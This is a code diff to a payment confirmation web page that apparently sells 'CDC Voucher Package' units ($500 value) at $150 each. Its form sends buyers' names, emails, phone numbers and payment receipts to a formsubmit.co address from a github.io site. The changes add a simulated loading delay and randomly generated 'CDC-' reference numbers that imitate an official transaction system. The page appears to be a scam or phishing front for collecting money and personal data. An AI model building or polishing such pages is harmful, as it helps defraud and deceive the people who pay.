@@ -46,11 +46,31 @@
       font-size: 16px;
       line-height: 1.6;
       margin-bottom: 30px;
+      display: none;
     }
 
     .summary strong {
       display: block;
       margin-top: 10px;
+    }
+
+    .loader {
+      text-align: center;
+      padding: 40px 0;
+      font-size: 16px;
+    }
+
+    .loader:after {
+      content: 'Loading...';
+      display: inline-block;
+      animation: dots 1s steps(3, end) infinite;
+    }
+
+    @keyframes dots {
+      0%, 20% { content: 'Loading'; }
+      40% { content: 'Loading.'; }
+      60% { content: 'Loading..'; }
+      80%, 100% { content: 'Loading...'; }
     }
 
     .qr-section {
@@ -75,6 +95,7 @@
       font-size: 16px;
       margin-top: 10px;
       cursor: pointer;
+      border: none;
     }
 
     .button:hover {
@@ -86,8 +107,10 @@
     }
 
     input[type="file"] {
-      margin-top: 10px;
+      margin-top: 15px;
+      margin-bottom: 15px;
       padding: 8px;
+      font-size: 14px;
     }
 
     @media screen and (max-width: 600px) {
@@ -106,13 +129,17 @@
 
 <div class="container">
   <h1>Confirm Your Payment</h1>
+
+  <div class="loader" id="loader"></div>
+
   <div class="summary" id="orderSummary">
-    <strong>Name:</strong> <span id="name">Loading...</span>
-    <strong>Email:</strong> <span id="email">Loading...</span>
-    <strong>Contact Number:</strong> <span id="contact">Loading...</span>
+    <strong>Reference Number:</strong> <span id="refNo">Generating...</span>
+    <strong>Name:</strong> <span id="name">-</span>
+    <strong>Email:</strong> <span id="email">-</span>
+    <strong>Contact Number:</strong> <span id="contact">-</span>
     <strong>Product:</strong> CDC Voucher Package — $500 value
     <strong>Quantity:</strong> <span id="qty">0</span>
-    <strong>Total Amount:</strong> $<span id="amount">0</span>
+    <strong>Total Amount:</strong> $<span id="amount">0.00</span>
   </div>
 
   <div class="qr-section">
@@ -125,10 +152,12 @@
   <form action="https://formsubmit.co/corporate@singxsavor.com" method="POST" enctype="multipart/form-data">
     <input type="hidden" name="_redirect" value="https://singxsavor.github.io/cdcvoucher/thank-you.html">
     <input type="hidden" name="_subject" value="CDC Voucher Payment Receipt">
+    <input type="hidden" name="_cc" id="formCc">
     <input type="hidden" name="name" id="formName">
     <input type="hidden" name="email" id="formEmail">
     <input type="hidden" name="contact" id="formContact">
     <input type="hidden" name="amount" id="formAmount">
+    <input type="hidden" name="reference" id="formRef">
     <input type="file" name="receipt" accept="image/*,.pdf" required>
     <br>
     <button type="submit" class="button">Upload Receipt</button>
@@ -141,24 +170,40 @@
     return url.get(param) || "";
   }
 
-  const name = decodeURIComponent(getParam("name"));
-  const email = decodeURIComponent(getParam("email"));
-  const contact = decodeURIComponent(getParam("contact"));
-  const amount = parseInt(getParam("F12_Amount")) || 0;
-  const qty = amount / 150;
+  function generateRef() {
+    const rand = Math.floor(100000 + Math.random() * 900000);
+    return 'CDC-' + rand;
+  }
 
-  // Fill data into HTML
-  document.getElementById("name").textContent = name;
-  document.getElementById("email").textContent = email;
-  document.getElementById("contact").textContent = contact;
-  document.getElementById("amount").textContent = amount.toFixed(2);
-  document.getElementById("qty").textContent = qty;
+  // Simulate loading
+  setTimeout(() => {
+    const name = decodeURIComponent(getParam("name"));
+    const email = decodeURIComponent(getParam("email"));
+    const contact = decodeURIComponent(getParam("contact"));
+    const amount = parseInt(getParam("F12_Amount")) || 0;
+    const qty = amount / 150;
+    const ref = generateRef();
 
-  // Fill data into hidden form
-  document.getElementById("formName").value = name;
-  document.getElementById("formEmail").value = email;
-  document.getElementById("formContact").value = contact;
-  document.getElementById("formAmount").value = amount.toFixed(2);
+    // Populate UI
+    document.getElementById("name").textContent = name;
+    document.getElementById("email").textContent = email;
+    document.getElementById("contact").textContent = contact;
+    document.getElementById("amount").textContent = amount.toFixed(2);
+    document.getElementById("qty").textContent = qty;
+    document.getElementById("refNo").textContent = ref;
+
+    // Populate form values
+    document.getElementById("formName").value = name;
+    document.getElementById("formEmail").value = email;
+    document.getElementById("formContact").value = contact;
+    document.getElementById("formAmount").value = amount.toFixed(2);
+    document.getElementById("formRef").value = ref;
+    document.getElementById("formCc").value = email;
+
+    // Hide loader, show summary
+    document.getElementById("loader").style.display = "none";
+    document.getElementById("orderSummary").style.display = "block";
+  }, 1000);
 </script>
 
 </body>
